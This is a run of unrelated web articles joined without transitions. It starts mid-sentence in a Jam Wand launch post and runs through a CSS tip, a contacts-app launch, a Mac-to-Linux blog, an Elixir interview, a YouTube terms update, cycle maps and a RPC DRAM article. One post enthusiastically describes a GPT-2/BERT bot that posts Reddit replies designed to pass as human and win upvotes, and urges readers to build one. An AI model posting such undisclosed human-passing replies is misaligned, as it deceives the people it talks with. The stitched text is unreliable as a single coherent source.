faster. </p><p>We think collaborative teams where everyone can contribute what they do best -- where customer support can update in-product help text, marketing can update landing page copy, dev rel can update developer docs, sales can update CTA text, and so on, leads to better products - which makes teams happy, users happy, it is a win-win.</p><h2 id="how-jam-wand-has-changed-our-workflow"><strong>How Jam Wand has changed our workflow</strong></h2><p>We built the Jam Wand website using Jam Wand (I know, you are very surprised). But it actually changed our workflow -- we didn’t have to have copy ready for engineering before they built the site. Instead, an engineer created the website scaffold with some placeholder text, and then deployed it, and once it was live, I could go in and write in the copy, right from the live website.</p><h2 id="a-new-way-to-build-and-maintain-documentation"><strong>A new way to build and maintain documentation</strong></h2><p>What we experienced at Cloudflare and what Jam users tell us, is that while all website copy is a challenge to update, developer documentation sites are a special challenge.</p><p>It’s too hard to suggest a fix to documentation (just explaining where the change should be in the docs site takes effort), and then to make the change, it has to be Jira-ed and scheduled into an engineering sprint. And so, many changes to docs that would improve the developer experience often aren’t made because there is too much overhead.</p><p>Jam transforms your developer documentation site into a collaborative workspace, like a Google Doc. And now, with Jam Wand, you can even change the copy right from the page, making it so that anyone can help improve your developer documentation. We’re excited for what that means for docs especially.</p><h2 id="can-t-wait-to-hear-what-you-think"><strong>Can’t wait to hear what you think</strong></h2><p>You can sign up for the beta at <a href="https://jam.dev/wand">jam.dev/wand</a>.</p><p>There’s a queue, but we want to prioritize bringing in people who care about collaboration and no-code workflows, who can help us shape the future of the product. You’ve read all the way to the end here, so it’s likely that’s you 😁 -- DM us <a href="https://twitter.com/scoopsofjam">@scoopsofjam</a> your waitlist # and we will try to bring you in early!</p><p>And lastly - Jam Wand was built by <a href="https://twitter.com/_cichocinski">Tomasz Cichociński</a>, and designed by <a href="http://gloriayanli.com/">Gloria Li</a>.

<p>To keep things streamlined with WordPress, I had to implement this hack the other day, where I wanted to disable tag links on just 1 page.</p>
<p>Instead of fiddling with a new plugin, I found it easier, in this case, to disable the link in the template engine with pure CSS.</p>
<p>The magic to remove the link feature lies in <code>pointer-events</code> while the rest ensures it doesn't look like one.</p>
<pre><code><span>a</span><span>.disabled</span> {
  <span>pointer-events</span>: none;      
  <span>text-decoration</span>: none;
  <span>cursor</span>: default;  
  <span>text-decoration</span>: none;
}
</code></pre>
<p>The semantics might be up for discussion, but the performance is possibly better than using Javascript.</p>
<p>This approach is available to all major browsers:  <a target="_blank" href="https://caniuse.com/pointer-events">CSS pointer-events (for HTML)</a> </p>

					<div><p>How do you make the mundane magical?&nbsp; Imagine if your contacts magically stayed up-to-date with no effort on your part.&nbsp; Or if the great photos you have of your friends got sent to them automatically. What if you never forgot another birthday?</p>

<p>The impossible is now possible. Smartphones have connected the world and put the entire internet into our pockets. We can get whatever we want delivered to our home whenever we want, sometimes by flying drone. With the rise of artificial intelligence, dreams of virtual assistants, self-driving cars and global facial recognition are no longer that far-fetched. However, despite transformational advances in technology, there are still tons of mundane, time-consuming tasks that we all do (or just don’t do) daily.<br><span><br><b>Sunshine’s technology will make the mundane effortless, free up your time, and make it easier to be thoughtful.</b></span></p>
<p><span>Every day, we muddle through tasks with technology that is “good enough” – contacting friends with stale information that may or may not reach them; searching through email for phone numbers and addresses that we know we have somewhere; manually and painstakingly creating group distribution lists for every occasion; scheduling time to get together with friends using a hodge-podge of calendar, email, and text; pinching and zooming through photos to find one with everyone’s eyes open. We’re used to the mess, and we’ve come to accept the friction.&nbsp;</span></p>

<p>No more.&nbsp; Everyday things should <b>just work</b>, and that’s Sunshine’s mission. We’re creating technology to address practical, everyday pain points in the basic, foundational tools that connect us with the people we care about. Ultimately, Sunshine will remove complexity in things like contact management, scheduling, event organization, and group communication so you can spend time more meaningfully.</p>

<p>We want to put the focus back on people, and let technology advance in its sophistication and fade into the background.</p>

<p>Today, we’re launching Sunshine Contacts (see our announcement here). Leveraging the power of artificial intelligence, Sunshine Contacts finds, deduplicates, and organizes your contacts. Using a variety of sources, we ensure your contact list is in one place, organized, always complete, and up-to-date.&nbsp; Sunshine Contacts makes your contacts <b>just work</b>.</p>

<p>Sunshine Contacts is our foundation. When your contacts are organized and truly work, they create a flywheel where scheduling, planning, organizing, and being thoughtful about your relationships becomes infinitely easier. When your contacts are complete, comprehensive, and accurately reflect relationships, you can spend your time building meaningful connections and shared experiences. Our future suite of products will make it effortless to keep in touch with the people in your life on a personal and professional level in a thoughtful way.</p>

<p>This is just the beginning.&nbsp; Sunshine is building a suite of services to solve the common pain points that modern technology hasn’t addressed.</p>

<p>At Sunshine, we strive to make the mundane magical. Our vision is to support your day-to-day life – to eliminate time spent on “technology” and simply make things better.&nbsp; Easier.&nbsp; If this means you save some “screen time” and give more thought to the most important people in your life, then we’ll know we’ve done it right.</p>

<p>We can’t wait to show you what’s next.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        <small>2020-11-18</small>
        <p>I’ve been mostly happy using a Mac since I got myself my first computer earned with programmer money. I believe it was a mid 2009 15" MacBook Pro. That was a computer I used at least until 2016 which I consider very decent usable life. At that point I had replaced the hard-drive with an SSD, upgraded the RAM and switched a battery that was worn out. I stopped using it when it just straight died some time in 2016.</p>
<h2 id="my-history-with-the-mac">My history with the Mac</h2>
<p>So what was that computer to me? It was an extremely well-built and solid-feeling piece of aluminium. A cool keyboard backlight. The magsafe charger and a bunch of USB ports. The keyboard and touchpad were best in class. The build quality was better than any laptop I had owned before. Partly because I had only bought the cheap ones before but also because they really were a step above at the time.</p>
<p>I got it primarily on recommendation from a friendly hacker who’s recommendations had never lead me wrong before. He spoke well of the underlying UNIX and the experience of using it. Fast, clean and visually pleasing. I think he mostly really liked the backlit keyboard, very hackerly. His recommendation held true, this computer was very good to me.</p>
<p>I’ve also been the admin on an Xserve server. That was wild. Neat UIs but buggy and finicky as all hell.</p>
<p>Since then I’ve used the second generation Macbook Air (I believe 2nd, first wedge version) at 11". That was a cool little machine and did what it did very nicely.</p>
<p>Hardware aside, MacOS in it’s earlier incarnations on these computers was always a snappy and competent experience. A polished surface which did a bunch of stuff under the hood that generally made it work better than the different Ubuntu desktop environments and various Windows versions I’ve had before. Things like Wifi and even Bluetooth felt good in a way they never had before.</p>
<p>A lot of it was the visual polish and the extremely snappy UI. But in total the experience was just great. Spotlight was glorious. I think my first upgrade was Snow Leopard which was generally a very good update as it focused on performance and stability.</p>
<p>As a developer’s machine it was fast enough, competent enough, got out of the way and the UNIX underpinnings meant I didn’t miss Linux at all. I’ve never been able to really connect with the equivalent powershell stuff in Windows. I guess I just like UNIX.</p>
<p>The only bad thing I can say about my early years of MacBook Pro usage was that the trackpad and the Magic Trackpad I got eventually are probably some of the biggest culprits in some of the RSI-style hand pain I’ve been dealing with. Trackpads are just murder on my hands and I worked loads off of that setup for a number of years. Took a while before I realized that it was trackpad-related.</p>
<p>Beyond that I’ve had some refurb Macs for my wife and assorted family, some 13" MBP for work at one point and then a 15" butterfly touchbar MBP for work. I think that was when I started to feel that Apple was diverging from my preferences in the MBP line.</p>
<h2 id="my-current-experience">My current experience</h2>
<p>That’s the same computer I have and work on now and it is.. fine? Maybe just OK. Not great. I’ve had some keys getting stuck but fixable with canned air. I don’t like the touchbar, it has been between useless and an actual hindrance. The TouchID power button is good though. I don’t like living in dongle-town though I mostly like USB C in the long run.</p>
<p>The reason it has been mostly fine for me is that I keep it on tray mounted on a VESA arm, dangling dongles like a technical octopus and I use external peripherals for input.</p>
<p>It gets really hot and loud and then it performs incredibly poorly. So I guess this is one of the throttliest generations. I think I had the “don’t charge it on the wrong side” problem as well. Some of the CPU shenanigans have calmed down as I installed the Turbo Boost Switcher tool to just disable the Turbo Boost, removing performance for peace and quiet.</p>
<p>As I’ve been using these devices it has become increasingly annoying to figure out how to install “unknown” apps. I need some non-discoverable terminal incantation to get the option to accept installing things that are unsigned. There’s always a new piece getting locked down. And while I think that’s often to the benefit of the average consumer, I’m not that. And I just get more annoyed.</p>
<p>I’ve been frustrated about the uninspiring performance delivered for the incredible brand markup that Apple charges. I don’t mind the computer being expensive if the experience is good and the hardware reasonable. The experience feels like it is slipping, especially for my needs and the hardware has just been getting less impressive to me.</p>
<h2 id="the-hardware">The hardware</h2>
<p>My gaming computer has a Ryzen. For a while I did my dev on that as we had just moved to our house and the office wasn’t finalized. Woof, aside from running Windows as a dev environment which I didn’t enjoy there was some serious upside on that machine.</p>
<p>On the Mac my options are very limited. I can’t get a Ryzen, I can’t get anything modern with Intel or meaningfully upgradable at all. The Mac Pro doesn’t count. It comes underspeced at hilarious prices. I like some of the design decisions but the price-point doesn’t make any kind of sense for me and what I do. I can’t buy an interesting Mac from a performance standpoint.</p>
<p>Or can I? Well, they just announced the M1 chip and ARM Macs are now a fact. I think I might get one at some point. For a travel laptop I don’t think the rest of the industry is ready to fight Apple. Battery life and good bang for buck power might actually keep a Mac in my life for that. But I feel like the general trend is away from what I want. Or I might just use my iPad Pro for that use-case.</p>
<p>I think the M1 will be quite impressive when the benchmarks roll in. I’m sure it will suit many people for real-world use-cases as well. However, from the first presentation on it and the first batch of Macs I don’t feel like the direction is for me. IO was heavily sacrificed. Upgradability is pretty much out the window. These things can be fine for a travel device for me where battery and weight are primary concerns. In that regard the new Air looks pretty good.</p>
<h2 id="the-software">The software</h2>
<p>Beyond that the coming OS, Big Sur, is taking MacOS in a direction I dislike. Catalina was quite messy and felt like it took steps toward walling off the Mac. Big Sur seems even more heavy-handed in that area and finally the M1 can push that even further if Apple feels like it. My trust is eroding on letting Apple set the tone for my computing life.</p>
<p>Don’t get me wrong, I think their approach to this transition is incredibly neat with Rosetta2 and how they are using the bytecode stuff with the App Store and whatnot. And the possibility to run iOS and iPad apps natively could be very useful. But none of this really moves the needle for me.</p>
<h2 id="so-whats-next">So what’s next?</h2>
<p>With my office in the garage as my primary work location I’m looking to transition to a desktop computer with lots of power. It will run Linux. Marking my first major return to desktop linux as a daily driver in a bundle of years. And it will run as light a desktop environment as I can stomach. I just wanted a stupid amount of performance to offset som of the UX niceties I know I will miss or have to customize  on my own.</p>
<p>I’m excited about exercising my development tools on a strong modern CPU rather than the throttled mess my current laptop offers. But I’m not thrilled about this move beyond the hardware aspect. I liked MacOS but I just don’t feel like Apple gives much of a care for the things I care about. And I feel like the software side on the Mac is slipping, consistently.</p>
<p>If they released an expandable Mac that wasn’t ridiculously expensive they would really make me think twice. But that feels unlikely.</p>
<p>So I’ll build myself a monstrous machine that can compensate in raw power for the potential lack of elegance and which offers unbounded flexibility rather than a poorly tended garden that someone keeps trying to wall in.</p>
<p>I’m not happy about it. I’ve generally enjoyed using my Macs. But when someone says “we’ll give you the full experience”, settling into that requires trust. And my trust that Apple and me are in alignment keeps fading.</p>
<p>Also, I’m developing a lot with heavily concurrent workloads. So I really look forward to exercising more cores. 2021, year of the Linux desktop (for me).</p>
<p>If you have thoughts, comments or a hell yeah you want to share about this topic or maybe you want me to cover some specific part of my transition here, let me know either via <a href="mailto:lars@underjord.io">lars@underjord.io</a> or on Twitter <a href="https://twitter.com/lawik">@lawik</a>. My first thoughts and my build might just show up first on my newsletter, so consider signing up for that below. It don’t track. Thanks for reading.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div id="post-body"><p>To say that Lars (a.k.a <a href="https://twitter.com/lawik">@lawik</a>) is only, as he describes himself, an “Elixir consultant with too much enthusiasm” will be an understatement. The guy is all over the place, writing software, helping businesses move forward, writing <a href="https://underjord.io/the-beam-marches-forward.html">inspiring stories</a> about the future of the BEAM, and co-hosting <a href="https://devchat.tv/podcasts/elixir-mix/">an Elixir podcast.</a> That is how I first got to know Lars. </p><p>Based in Sweden, Lars started his programming journey by building websites with Notepad, then learning PHP and eventually taking his hobby pro through contract work, a failed startup, a couple of product teams and onward into independent consulting. He lives along the west coast of Sweden - a little way out of the city, where he attempts to grow vegetables with his wife and baby. The baby is terrible at growing vegetables.</p><p>In 2016 Lars discovered Erlang/Elixir, and this changed his view on developing software.</p><h2 id="what-brought-you-to-elixir">What brought you to Elixir?</h2><p><strong>Lars:</strong> At first, it was a bit of hype. I had a colleague who was quite a good talker and he went on at length about the legendary resilience of Erlang and hot updates for buried telephone switches. He spoke very well of Ecto changesets and was generally, very positive about Elixir. I ended up looking at talks about Phoenix. This was when <a href="https://hexdocs.pm/phoenix/channels.html">Channels</a> was the new hotness and just before <a href="https://hexdocs.pm/phoenix/Phoenix.Presence.html">Presence</a> took the keynote stage. Looking at what the community was putting out made me give Elixir a try. When I went into business for myself, I was expecting to do a lot of Python, but I intended to try and get into Elixir.</p><p>I enjoy toying around with Raspberry Pi, so it was just a matter of time before I started playing with <a href="https://www.nerves-project.org/">Nerves</a>. I wanted to use the <a href="https://shop.pimoroni.com/products/inky-what?variant=21214020436051">Inky eInk</a> display with Nerves but the library was only available for Python. So, I decided to make a pure Elixir reimplementation. It proved to be a rabbit hole, but the Nerves community was very welcoming and helpful, and I was sold on Elixir for good. Love that crew!</p><p>I feel like I’ve written <a href="https://underjord.io/why-am-i-interested-in-elixir.html">at</a> <a href="https://underjord.io/why-am-i-still-excited-about-elixir.html">least</a> <a href="https://underjord.io/more-than-one-thing-at-a-time.html">four</a> <a href="https://underjord.io/the-beam-marches-forward.html">blog posts</a> about why I remain interested in and excited by Elixir and the BEAM. I like Python. I understand why people like Node.js but I can’t quite get excited about it. Either you go higher level on top of good abstractions, as the BEAM has, or you go lower level for unconstrained performance and flexibility.</p><h2 id="elixir-and-erlang-differ-significantly-from-other-mainstream-programming-languages-what-did-you-find-most-challenging-when-starting-with-the-stack">Elixir and Erlang differ significantly from other mainstream programming languages. What did you find most challenging when starting with the stack?</h2><p><strong>Lars:</strong> Immutability and the functional programming paradigm. Much of my early code did nothing or only did things by accident because I expected that the Map functions would mutate the map, not return a new one. Grasping map, reduce and all of their derivatives in the Enum module took me a bit. It was an adaptation process.</p><p>I guess it has also taken a while to disentangle <em>use</em>, <em>require</em>, <em>import</em> and <em>alias</em>. I still wouldn’t take bets on my understanding of <em>require</em> ;)</p><p>I’ve found the community incredibly welcoming at every step. I’ll call out <a href="https://twitter.com/nyaray">Emilio Nyaray</a> for helping me with some major refactoring and absorbing idiomatic Elixir. I hope everyone has such a good reception and it feels like the general feel of the community is very positive.</p><h2 id="tell-us-a-bit-about-your-most-recent-project-why-did-you-choose-elixir-for-it">Tell us a bit about your most recent project. Why did you choose Elixir for it?</h2><p><strong>Lars:</strong> A little while ago I made <a href="https://underjord.io/live-server-push-without-js.html">a very silly thing</a>. It is a way to show live information on a web page without using Javascript. Instead, it uses the <a href="https://en.wikipedia.org/wiki/Motion_JPEG">MJPEG</a> video protocol to deliver a new frame whenever the state changes. I used it to implement a live counter.</p><p>I used Plug and some code I found that the Nerves people had put together. The state is managed by a GenServer which keeps track of the connections as they come in, asking for the ”image”. It would add them to the list, render a new frame with some text on it, and send it to everyone connected. &nbsp;That would have been incredibly finicky in most runtimes. In my case, the biggest challenge was hitting the front page of Hacker News, where my Nginx config became a bottleneck for concurrent connections. I might have also needed to tweak my Plug a bit. It all maxed out at 450 or so concurrent connections, and I think it should be able to do way more.</p><p>I am about to add some upgrades to the <a href="https://beambloggers.com/">Beambloggers Webring</a> soon that follow the same vein. I don’t like running a database if I don’t need one. So the MJPEG thing is just in-memory data and a temporary state. I restart it, the connections are gone, and start building up again. Similarly, I want Beambloggers to bring in some fresh information about the different blogs. So I’ll have it run a GenServer that pulls in RSS feeds and parses out some recent items that I can link to. In-memory, background work.</p><p>Such use cases are something I’d hesitate to do in Python, for example. If I build something stateful in Python, I feel like it is bound to leak somewhere. Elixir and Erlang have abstractions that allow me to do such things with confidence.</p><h2 id="you-also-do-elixir-consulting-what-kinds-of-applications-do-your-clients-choose-the-beam-for-as-opposed-to-other-tech-stacks"><br>You also do Elixir consulting. What kinds of applications do your clients choose the BEAM for, as opposed to other tech stacks?</h2><p><strong>Lars: </strong>Distributed applications that run indefinitely. Those line up with the absolute majority of work I’ve ever done. Servers, services, and web applications. If I were building large amounts of CLI tooling, I wouldn’t pick it. If I needed native desktop bindings, I wouldn’t pick it. But generally, I’m in the web application world.</p><p>As the cultural successor to Ruby on Rails, I am seeing Phoenix being used all over the place and quite popular with startups. I have seen a lot of companies picking up Elixir without necessarily knowing much about OTP. I think this is fine, and mostly speaks to the maturity of Phoenix and Ecto that people don’t need to.</p><h2 id="in-the-era-of-kubernetes-and-microservices-where-do-you-see-monolithic-beam-applications-fit-into-the-picture">In the era of Kubernetes and Microservices, where do you see monolithic BEAM applications fit into the picture?</h2><p><strong>Lars:</strong> It is interesting. The way Erlang structures things in multiple <em>applications</em> on a <em>node</em> as part of a <em>cluster</em> brings in some infrastructure concerns. I think some people worry that this unconventional approach is a problem when working in a polyglot environment, for example. I don’t think so. Lots of people put the BEAM in their containers and ship it out to the Kubernetes cluster in the same way as every other stack. Microservices tend to be about the contracts you expose, not the internals of how the application runs. Therefore, the fact you run a BEAM application or even a cluster of BEAM applications as one service is perfectly fine.</p><p>Where I believe much of the power of BEAM is though, is if you don’t rely on microservices and a polyglot-heavy environment. You might then be able to cut off a lot of dead weight. Or at least, manage the complexity using tools you know, rather than write YAML until it goes away. Some of the tools are there by design; others are perhaps, what we should be building in the future. I’ve gotten into it to some extent in my blog post <a href="https://underjord.io/the-beam-marches-forward.html"><em>The BEAM marches forward.</em></a></p><p><br>For an in-between path, I would take a look at <a href="https://www.nomadproject.io/">Nomad</a> which seems to be a slightly lighter Kubernetes competitor that can run things without containers. I think it suits the BEAM very well, as Elixir releases handle many of the perks of containerization. I haven’t tried it but if you do, let me know. I am curious about how Nomad differs from Kubernetes.</p><h2 id="as-someone-listening-to-podcasts-for-over-15-years-i-can-t-help-but-ask-how-does-one-get-the-courage-to-host-a-podcast">As someone listening to podcasts for over 15 years, I can’t help but ask. How does one get the courage to host a podcast?</h2><p><strong>Lars:</strong> I don’t think I’m particularly brave. You should see how uncomfortable I am on ladders.</p><p>I think I picked up a habit of pressing through discomfort partly in my teens and partly running a startup with a mentor of mine. When I was around 14, my dad passed away, essentially a heart attack out of the blue. That experience totally shifted my threshold for pain or discomfort and deeply changed how I approached life. That change in attitude was probably part of why I was keen to do the startup. And the startup led to everything else. Turns out that running a business when I barely knew what I was doing as a technical lead was a constant exercise in being okay with discomfort.</p><p>I don’t recommend overworking. I don’t recommend burning yourself out on a startup. Yet, the discomfort is part of the learning sometimes. If you spend a lot of time outside your comfort zone, you are likely to learn more. Being aware that you are choosing discomfort and staying with it is powerful.</p><p>Oh, a podcast? Well, you get asked on as a guest and enjoy it. And then, when the OG host goes off to start a new one, you get contacted as one of the potential new hosts. And since you try not to worry too much and are willing to tackle discomfort, you fret about it for a bit, ask too many questions, and then give it a shot.</p><p><strong>Lars:</strong> It might feel daunting at first. Don’t feel pressure to understand the BEAM, Erlang, OTP, and all of that good stuff right away. If you are an inexperienced developer, any language can seem imposing. We all end up being beginners when we move over to a new ecosystem. I think we will all be happier if we concede that we will not master everything and will only learn a portion of it. What one should focus on instead is building software well.</p></div>

        <div><p>We periodically update our Terms of Service to make sure they are clear, easy to understand and meet the needs of our partners, advertisers and viewers. Starting today, we’re rolling out an updated Terms of Service in the United States. These new terms will be effective in countries outside of the United States in mid-year 2021. Please read through the <a href="https://www.youtube.com/t/terms">updated terms</a> carefully, they include the following changes.</p><p>First, our Terms of Service already expressly state that you are not allowed to “collect or harvest any information that might identify a person (for example, usernames), unless permitted by that person.” This has always included facial recognition data, and with today’s updated Terms of Service, we are making that explicitly clear.</p><p>Second, ads can now appear on videos from channels not in the YouTube Partner Program (YPP), and we will begin gradually placing ads on brand safe videos. This is part of our ongoing investments in new solutions, like Home Feed ads, that help advertisers responsibly tap into the full scale of YouTube to connect with their audiences and grow their businesses. Advertisers will continue to have full access to our brand suitability controls. Over the past three years, we improved our ability to identify appropriate placements for advertisers, in part by working closely with our advertising partners and <a href="https://wfanet.org/knowledge/item/2020/09/23/WFA-and-platforms-make-major-progress-to-address-harmful-content">industry organizations</a>. Because these channels are not in YPP, there is no creator revenue share, but creators can still apply to YPP once they hit the <a href="https://support.google.com/youtube/answer/72851?hl=en">eligibility criteria</a>, which remains the same.</p><p>Finally, for U.S. creators in YPP, our updated Terms state that any revenue payments from YouTube will now be treated as royalties from a U.S. tax perspective, and that Google will withhold taxes from these payments if it is required by law. U.S. creators will generally be unaffected by these withholding taxes as long as they provide valid tax documentation in <a href="https://support.google.com/adsense/answer/2490070?hl=en">Adsense</a>. For creators outside of the U.S., we will provide more details in 2021 as the terms become available in their countries.</p><p>You can view the previous Terms of Service and how it compares with this update in our <a href="https://yt.be/help/ToS20">help forum</a>.</p></div>

<p>Sometimes I find these AI / programming hobby projects that I just wished I had thought of… </p>



<p><a href="https://www.linkedin.com/in/willstedden/"><strong>Will Stedden</strong></a> combined OpenAI’s <strong><a href="https://openai.com/blog/better-language-models/">GPT-2</a></strong> deep learning text generation model with another deep-learning language model by Google called <strong><a href="https://towardsdatascience.com/bert-explained-state-of-the-art-language-model-for-nlp-f8b21a9b6270">BERT</a></strong> (Bidirectional Encoder Representations from Transformers) and created an elaborate architecture that had one purpose: <strong><em>posting the best replies on Reddit.</em></strong></p>



<p>The architecture is shown at the end of this post — copied from Will’s original blog<em> <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">here</a></em>. Moreover, you can read&nbsp;<a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">this post</a>&nbsp;for details regarding the construction of the system. But let me see whether I can explain you what it does in simple language. </p>



<p>The below is what a Reddit comment and reply thread looks like. We have <em>str8cokane </em>making a comment to an original post (not in the picture), and then <em>tupperware-party</em> making a reply to that comment, followed by another reply by <em>str8cokane</em>. Basically, Will wanted to create an AI/bot that could write replies like <em>tupperware-party</em> that real people like <em>str8cokane</em> would not be able to distinguish from “real-people” replies.</p>



<p>Note that with 4 <strong>points</strong>, <em>str8cokane</em>‘s original comments was <em><strong>“liked”</strong></em> more than <em>tupperware-party</em>‘s reply and <em>str8cokane</em>‘s next reply, which were only <strong><em>upvoted </em></strong>2 and 1 times respectively.</p>



<figure><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party3.png" alt="gpt2-bert on China"><figcaption>Example reddit comment and replies (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/</a>)</figcaption></figure>



<p>So here’s what the final architecture looks like, and my attempt to explain it to you.</p>



<ol><li>Basically, we start in the upper left corner, where Will uses a database (i.e. <em>corpus</em>) of Reddit comments and replies to fine-tune a standard, pretrained GPT-2 model to get it to be good at <strong>generating (red: “fake”) realistic Reddit replies</strong>. </li><li>Next, in the upper middle section, these fake replies are piped into a standard, pretrained BERT model, along with the original, real Reddit comments and replies. This way the BERT model sees both real and fake comments and replies. Now, <strong>our goal is to make replies that are undistinguishable from real replies</strong>. Hence, this is the task the BERT model gets. And we keep fine-tuning the original GPT-2 generator until the BERT discriminator that follows is no longer able to distinguish fake from real replies. Then the generator is “fooling” the discriminator, and we know we are generating fake replies that look like real ones! <br><em>You can find more information about such generative adversarial networks <a href="https://paulvanderlaken.com/2017/10/30/generative-adversarial-networks-gan-explained/">here</a>.</em></li><li>Next, in the top right corner, we fine-tune another BERT model. This time we give it the original Reddit comments and replies along with the amount of times they were upvoted (i.e. sort of like likes on facebook/twitter). Basically, we train a BERT model to <strong>predict for a given reply, how much likes it is going to get</strong>.</li><li>Finally, we can go to production in the lower lane. We give a real-life comment to the GPT-2 generator we trained in the upper left corner, which produces several fake replies for us. These candidates we run through the BERT discriminator we trained in the upper middle section, which determined which of the fake replies we generated look most real. Those fake but realistic replies are then input into our trained BERT model of the top right corner, which predicts for every fake but realistic reply the amount of likes/upvotes it is going to get. Finally, <strong>we pick and reply with the fake but realistic reply that is predicted to get the most upvotes!</strong></li></ol>



<figure><p><a href="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"><img src="https://www.bonkerfield.org/assets/images/2020/gpt2_bert_workflow.png"></a>
</p><figcaption>What Will’s final architecture, combining GPT-2 and BERT, looked like (via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org</a>)</figcaption></figure>



<p>The results are astonishing! Will’s bot sounds like a real youngster internet troll! Do have a look at <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">the original blog</a>, but here are some examples. Note that <em>tupperware-party</em> — the Reddit user from the above example — is actually Will’s AI. </p>



<figure><a href="https://www.reddit.com/r/sciencefiction/comments/evqiti/dune_logo_unveiled_at_event_copyright_claimants/fg44yzw/?context=3"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party1.png" alt="COMMENT: 'Dune’s fandom is old and intense, and a rich thread in the cultural fabric of the internet generation' BOT_REPLY:'Dune’s fandom is overgrown, underfunded, and in many ways, a poor fit for the new, faster internet generation.'"></a></figure>



<figure><a href="https://www.reddit.com/r/BurningMan/comments/ep6pyq/playa_lung/feilsjn/?context=8&amp;depth=9"><img src="https://www.bonkerfield.org/assets/images/2020/tupperware-party2.png" alt="bot responds to specific numerical bullet point in source comment"></a></figure>



<p>Will ends his blog with <a href="https://www.bonkerfield.org/2020/02/reddit-bot-gpt2-bert/">a link to the tutorial</a> if you want to build such a bot yourself. Have a try!</p>



<p>Moreover, he also notes the ethical concerns:</p>



<blockquote><p>I know there are definitely some ethical considerations when creating something like this. The reason I’m presenting it is because I actually think it is&nbsp;<a href="https://www.wired.com/story/company-wants-billions-make-ai-safe-humanity/">better</a>&nbsp;for more people to know about and be able to grapple with this kind of technology. If just a few people know about the capacity of these machines, then it is more likely that those small groups of people can abuse their advantage.</p><p>I also think that this technology is going to change the way we think about what’s important about being human. After all, if a computer can effectively automate the paper-pushing jobs we’ve constructed and all the bullshit we create on the internet to distract us, then maybe it’ll be time for us to move on to something more meaningful.</p><p>If you think what I’ve done is a problem feel free to&nbsp;email me&nbsp;, or publically shame me on&nbsp;<a href="https://twitter.com/bonkerfield">Twitter</a>.</p><cite>Will Stedden via <a href="https://www.bonkerfield.org/2020/02/combining-gpt-2-and-bert/">bonkerfield.org/2020/02/combining-gpt-2-and-bert/</a></cite></blockquote>

				<p>We cycled the Swiss part of the Rhine Cycleway last week, with our <a href="https://www.bikefriday.com/bicycles/touring/1248">folding</a> <a href="http://airnimal.eu/products/chameleon/performance-sport/">bikes</a> neatly stowed in suitcases for the flight. A combination of <em><a href="http://cycle.travel/">cycle.travel</a></em> (natch), the Cicerone guide, and the excellent <a href="https://itunes.apple.com/gb/app/mapout/id477094081?l=en&amp;mt=8">MapOut</a> app guided us safely along the way: a very modern combination of mapping styles.</p><p>Wandering around Zürich, waiting for our flight home, I was intrigued by this cycle map in the window of a (closed) antiquarian bookstore:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_1.jpg"></p><p>And if that isn’t clear enough from the pic snatched through a window, here’s a better excerpt from <a href="http://www.ak-ansichtskarten.de/shop/ak/46/back4684588/Rueckseite-Deutsche-Strassenprofilkarte-fuer-Radfahrer-Strassburg-und-Umgebung-Naumann-s-Fahrraeder-Seidel-Naumann-Dresden.jpg">an example</a> I found online:</p><p><img src="http://blog.systemed.net/images/original/strassenprofilkarte_2.jpg"></p><p>On major climbs, rather than strictly following the two-dimensional curves of the route as a conventional map would do, the map shows a miniature gradient profile for that particular hill.</p><p>Bending geometry to show a subjective view of space is nothing unusual. The Tube map (and its many imitators) famously do it, as do the one-dimensional strip maps that Laurence Penney has <a href="http://www.youshouldliketypetoo.com/blog/misc/one-dimensional-maps/">lovingly curated</a>&nbsp;(and, indeed, one of Laurence’s maps has a <a href="http://www.youshouldliketypetoo.com/wp-content/uploads/2012/12/one-dimensional-maps-14.jpg">passing resemblance</a> to these German sheets). But I’ve never seen quite this approach taken before. It’s a recognition that – just as distance is immaterial to the Tube passenger – to the cyclist, hills are as much part of the ‘distance travelled’ as are the ticking miles on the cycle computer.</p><p>Not that the Radfahrer in question would have had cycle computers, of course. There appear to have been 80 of these sheets, published by&nbsp;Mittelbach's Verlag of Leipzig with the co-operation and support of the national German cycling organisations <em>(unter Mitwirkung der Gauverbände des Deutschen Radfahrerbundes und der Konsulate der Allgemeinen Radfahrer-Union)</em>. They seem to date from the beginning of the 20th century, and are not yet collectable, if the <a href="http://www.abebooks.co.uk/Deutsche-Strassenprofilkarte-Radfahrer-Mitwirkung-Gauverb%C3%A4nde-Deutschen/6461038791/bd">prices on Abebooks</a> are anything to go by.</p><p>And in one of those curious coincidences…</p><p>I originally finished this post with “<span>I don’t expect to see a revival any day soon”, but the day after I posted this, Sustrans Midlands retweeted a link to <a href="https://twitter.com/Lunto_Sustrans/status/496934542880833536">exactly such a map</a>. This ‘Accessible Map’ of Queenstown, New Zealand, was particularly intended for wheelchair users and other people who find steep slopes challenging:</span></p><p><img src="http://blog.systemed.net/images/original/modern_elevation_map.jpg"></p><p><span>You can download the full map as a PDF from drcqueenstown.co.nz. The cartographer, Toby Eglesfield, has also written an <a href="http://www.tobyeglesfield.com/a-map-showing-the-steepness-of-streets/">extensive, well-illustrated blog post</a> explaining the design choices he made – and&nbsp;in the comments, two people raise the idea of generating such a map from OpenStreetMap data.

        <p>The Internet of Things is one of the areas that is hugely benefiting from miniaturization of semiconductor technologies, as more computing power can be encapsulated into increasingly smaller devices. Shrinking in size and requiring less power, various devices - including AI-capable ones - are applied in ways that were not possible a few years ago. One of the new and exciting developments in this space is the emergence of <a href="https://etronamerica.com/products/rpc-dram/">RPC (reduced pin-count) DRAM</a> - a small form factor memory, for which Antmicro has developed support in the open source memory controller, LiteDRAM. Our contribution, already made available on <a href="https://github.com/antmicro/litedram/tree/rpc-dram-support">GitHub</a> is being polished and undergoing final tests, and will be mainlined shortly.</p>

<h3 id="what-is-rpc-dram">What is RPC DRAM</h3>

